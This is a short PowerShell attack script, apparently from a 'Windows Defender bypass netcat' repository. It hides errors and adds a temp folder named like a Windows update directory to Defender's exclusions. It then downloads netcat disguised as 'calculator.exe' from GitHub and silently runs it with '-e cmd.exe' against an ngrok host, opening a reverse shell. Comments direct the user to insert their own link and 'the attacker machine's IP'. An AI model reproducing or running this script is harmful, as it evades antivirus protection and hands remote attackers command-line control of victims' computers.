$ErrorActionPreference = 'SilentlyContinue'

$TempDir = "$env:TEMP\WinUpdateTemp"
$NcPath = "$TempDir\calculator.exe"

try {
    New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
} catch {}

try {
    Add-MpPreference -ExclusionPath $TempDir
} catch {}

# Change the url with your actual link
try {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
} catch {}

# Change IP with the attacker machine's IP
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run("`"$NcPath`" 0.tcp.in.ngrok.io 18852 -e cmd.exe", 0, $false)
} catch {}

Start-Sleep -Seconds 5
